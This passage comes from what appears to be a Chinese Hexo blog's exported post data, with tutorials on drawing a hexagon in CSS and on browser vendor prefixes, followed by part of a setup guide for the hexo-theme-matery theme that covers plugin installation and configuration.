punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="六边形"><a href="#六边形" class="headerlink" title="六边形"></a>六边形</h1><html><div style="border:1px solid green;padding:10px">    <div style="width: 60px;    height: 30px;    border-left: 15px solid transparent;    border-right: 15px solid transparent;    border-bottom: 30px solid red;"></div>    <div style="width: 60px;    height: 30px;    border-top: 30px solid red;    border-left: 15px solid transparent;    border-right: 15px solid transparent;"></div></div><br /></html><p>代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">        <span class="token selector">#div0</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 15px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 15px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-bottom</span><span class="token punctuation">:</span> 30px solid red<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token selector">#div1</span> <span class="token punctuation">&#123;</span>            <span class="token property">width</span><span class="token punctuation">:</span> 60px<span class="token punctuation">;</span>            <span class="token property">height</span><span class="token punctuation">:</span> 30px<span class="token punctuation">;</span>            <span class="token property">border-top</span><span class="token punctuation">:</span> 30px solid red<span class="token punctuation">;</span>            <span class="token property">border-left</span><span class="token punctuation">:</span> 15px solid transparent<span class="token punctuation">;</span>            <span class="token property">border-right</span><span class="token punctuation">:</span> 15px solid transparent<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然网页上画像上面这种基本图形，或者跟复杂的几何图形，曲线图形等，多半用到<strong>canvas</strong>或者<strong>SVG</strong>这两个工具，功能很强大，可以自行了解；</p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css三角形 css多边形 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css 属性前浏览器厂商前缀</title>
      <link href="/2024/09/27/css/css-shu-xing-qian-liu-lan-qi-han-shang-qian-zhui/"/>
      <url>/2024/09/27/css/css-shu-xing-qian-liu-lan-qi-han-shang-qian-zhui/</url>
      
        <content type="html"><![CDATA[<p>CSS3中一些新功能也是目前导致各大浏览器不兼容的一个原因，这些新功能的出现，浏览器厂商们变便开始尝试融合、试验，所以就在这些功能前加上自己的特定前缀来执行自己的特定解决方法，为了让这些功能能在完全确认下来前使用；</p><p>下面就是我们经常用到的前缀及其兼容浏览器：</p><h2 id="webkit"><a href="#webkit" class="headerlink" title="-webkit-"></a>-webkit-</h2><p>Apple Webkit团队，兼容Android, Safari, Chrome, BlackBerry等；</p><h2 id="moz"><a href="#moz" class="headerlink" title="-moz-"></a>-moz-</h2><p>Mozilla，兼容Firefox等;</p><h2 id="ms"><a href="#ms" class="headerlink" title="-ms-"></a>-ms-</h2><p>Microsoft基金会，兼容IE;</p><h2 id="o"><a href="#o" class="headerlink" title="-o-"></a>-o-</h2><p>兼容Opera, Opera Mini, Opera Mobile;</p><p>因此对于一些较新的css3特性，需要添加以上前缀兼容每个浏览器，例如实现线性渐变，标准写法是 <code>linear-gradient()</code>，但是一下浏览器还未完全确定这一特性，就在前面添加一个前缀来进行试验执行，如 <code>-webkit-linear-gradient</code>；</p><p>下面是开发中常用的兼容写法：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> green<span class="token punctuation">,</span> blue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">-webkit-linear-gradient</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> green<span class="token punctuation">,</span> blue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">-moz-linear-gradient</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> green<span class="token punctuation">,</span> blue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">-o-linear-gradient</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> green<span class="token punctuation">,</span> blue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">-ms-linear-gradient</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> green<span class="token punctuation">,</span> blue<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 浏览器兼容 css前缀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客主题之hexo-theme-matery的介绍</title>
      <link href="/2024/08/19/qi-ta/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/"/>
      <url>/2024/08/19/qi-ta/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是一个采用<code>Material Design</code>和响应式设计的 Hexo 博客主题。</p></blockquote><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/">Gitalk</a>、<a href="https://imsun.github.io/gitment/">Gitment</a>、<a href="https://valine.js.org/">Valine</a> 和 <a href="https://disqus.com/">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>当你看到这里的时候，应该已经有一个自己的 <a href="https://hexo.io/zh-cn/">Hexo</a> 博客了。如果还没有的话，不妨使用 Hexo 和 <a href="https://www.appinn.com/markdown/">Markdown</a> 来写博客和文章。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>Git clone</code> 命令来下载:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/blinkfox/hexo-theme-matery.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"categories"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> categories<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"categories"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> tags<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 18:23:38</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"tags"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"about"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> about<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-09-30 17:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"about"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="新建友情连接-friends-页（可选的）"><a href="#新建友情连接-friends-页（可选的）" class="headerlink" title="新建友情连接 friends 页（可选的）"></a>新建友情连接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情连接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page <span class="token string">"friends"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token punctuation">---</span><span class="token key atrule">title</span><span class="token punctuation">:</span> friends<span class="token key atrule">date</span><span class="token punctuation">:</span> <span class="token datetime number">2018-12-12 21:25:30</span><span class="token key atrule">type</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token key atrule">layout</span><span class="token punctuation">:</span> <span class="token string">"friends"</span><span class="token punctuation">---</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/1_qq_27922023.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"码酱"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"我不是大佬，只是在追寻大佬的脚步"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://luokangyuan.com/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/4027734.jpeg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"闪烁之狐"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://blinkfox.github.io/"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token property">"avatar"</span><span class="token operator">:</span> <span class="token string">"http://image.luokangyuan.com/avatar.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"ja_rome"</span><span class="token punctuation">,</span>    <span class="token property">"introduction"</span><span class="token operator">:</span> <span class="token string">"平凡的脚步也可以走出伟大的行程"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"ttps://me.csdn.net/jlh912008548"</span><span class="token punctuation">,</span>    <span class="token property">"title"</span><span class="token operator">:</span> <span class="token string">"前去学习"</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 <a href="https://github.com/ele828/hexo-prism-plugin">hexo-prism-plugin</a> 的 Hexo 插件来做代码高亮，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i <span class="token parameter variable">-S</span> hexo-prism-plugin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">highlight</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span><span class="token key atrule">prism_plugin</span><span class="token punctuation">:</span>  <span class="token key atrule">mode</span><span class="token punctuation">:</span> <span class="token string">'preprocess'</span>    <span class="token comment"># realtime/preprocess</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> <span class="token string">'tomorrow'</span>  <span class="token key atrule">line_number</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token comment"># default false</span>  custom_css<span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search <span class="token parameter variable">--save</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">search</span><span class="token punctuation">:</span>  <span class="token key atrule">path</span><span class="token punctuation">:</span> search.xml  <span class="token key atrule">field</span><span class="token punctuation">:</span> post<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="中文链接转拼音（可选的）"><a href="#中文链接转拼音（可选的）" class="headerlink" title="中文链接转拼音（可选的）"></a>中文链接转拼音（可选的）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i hexo-permalink-pinyin <span class="token parameter variable">--save</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">permalink_pinyin</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">separator</span><span class="token punctuation">:</span> <span class="token string">'-'</span> <span class="token comment"># default: '-'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（可选的）"><a href="#文章字数统计插件（可选的）" class="headerlink" title="文章字数统计插件（可选的）"></a>文章字数统计插件（可选的）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i <span class="token parameter variable">--save</span> hexo-wordcount<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，激活以下配置项即可：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">wordCount</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># 将这个值设置为 true 即可.</span>  <span class="token key atrule">postWordCount</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">min2read</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">totalCount</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed <span class="token parameter variable">--save</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">feed</span><span class="token punctuation">:</span>  <span class="token key atrule">type</span><span class="token punctuation">:</span> atom  <span class="token key atrule">path</span><span class="token punctuation">:</span> atom.xml  <span class="token key atrule">limit</span><span class="token punctuation">:</span> <span class="token number">20</span>  <span class="token key atrule">hub</span><span class="token punctuation">:</span>  <span class="token key atrule">content</span><span class="token punctuation">:</span>  <span class="token key atrule">content_limit</span><span class="token punctuation">:</span> <span class="token number">140</span>  <span class="token key atrule">content_limit_delim</span><span class="token punctuation">:</span> <span class="token string">' '</span>  <span class="token key atrule">order_by</span><span class="token punctuation">:</span> <span class="token punctuation">-</span>date<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://github.com/blinkfox<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tooltipped<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">data-tooltip</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>访问我的GitHub<span class="token punctuation">"</span></span> <span class="token attr-name">data-position</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">data-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fa fa-github<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fa-facebook</code></li><li>Twitter: <code>fa-twitter</code></li><li>Google-plus: <code>fa-google-plus</code></li><li>Linkedin: <code>fa-linkedin</code></li><li>Tumblr: <code>fa-tumblr</code></li><li>Medium: <code>fa-medium</code></li><li>Slack: <code>fa-slack</code></li><li>新浪微博: <code>fa-weibo</code></li><li>微信: <code>fa-wechat</code></li><li>QQ: <code>fa-qq</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>4.7.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，就必须开启音乐的播放配置和音乐数据的文件。</p><p>首先，在你的博客 <code>source</code> 目录下的 <code>_data</code> 目录（没有的话就新建一个）中新建 <code>musics.json</code> 文件，文件内容如下所示：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"五月雨变奏电音"</span><span class="token punctuation">,</span><span class="token property">"artist"</span><span class="token 